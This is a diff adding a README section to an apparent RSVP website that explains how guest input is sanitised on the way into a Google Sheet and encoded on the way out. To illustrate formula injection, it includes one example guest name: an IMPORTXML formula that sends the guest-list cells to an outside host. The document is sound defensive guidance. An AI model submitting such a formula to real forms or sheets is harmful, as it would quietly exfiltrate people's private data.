@@ -128,6 +128,47 @@ Commit / upload the change to wherever the site is hosted. Done.
   does: **Deploy → Manage deployments → ✏️ → Version: New version →
   Deploy**.
 
+## How guest input is sanitised
+
+The RSVP form is the one place strangers can put text into your Sheet, so
+everything typed into it is cleaned on the way in and encoded again on the
+way out — differently for each destination, because each one reads text by
+its own rules.
+
+**On the way in** (`clean_` in `Code.gs`, mirrored by `sanitizeText` in
+`script.js`): text is Unicode-normalised, then stripped of control
+characters, bidirectional overrides and zero-width characters, has runs of
+whitespace collapsed, and is truncated — names to 120 characters, wishes to
+1000. Phone numbers are reduced to 10 digits, `attendance` is matched
+against a whitelist rather than cleaned, `guests` is clamped to 0–20, and
+the timestamp is generated on the server rather than accepted from the
+request. Requests larger than 8 KB, or that aren't a JSON object, are
+rejected before anything is parsed.
+
+The browser copy keeps what a guest sees consistent with what is stored;
+the `Code.gs` copy is the one that protects you, since anyone can post to
+the web app URL directly. Both run.
+
+**On the way out**, the same text is encoded for wherever it is going:
+HTML-escaped for the dashboard and the wish wall, XML-escaped and written
+as inline strings for the `.xlsx` export, and prefixed with an apostrophe
+in the `.csv` export if it starts with `=`, `+`, `-` or `@`.
+
+That last one matters most in the Sheet itself. Apps Script writes a value
+the same way a person typing it would, so a guest whose "name" is
+`=IMPORTXML("https://somewhere-else/?d="&JOIN(",",B2:C99), "//x")` would get
+a live formula in your spreadsheet — one that runs when you open it and can
+quietly send your guest list elsewhere. `writeRow_` sets each
+guest-supplied cell to plain-text format *before* writing, so the text is
+stored exactly as it arrived and stays text.
+
+*Deployed the backend before this was added?* Paste the latest `Code.gs`
+over the old one and publish a new version (**Deploy → Manage deployments →
+✏️ → Version: New version → Deploy**). The per-row formatting in
+`writeRow_` applies to sheets created earlier too, so there is nothing to
+fix by hand — though it is worth scanning existing rows for any cell that
+begins with `=`.
+
 ## Notes & troubleshooting
 
 - **The wish wall** on the site still shows wishes saved in each visitor's
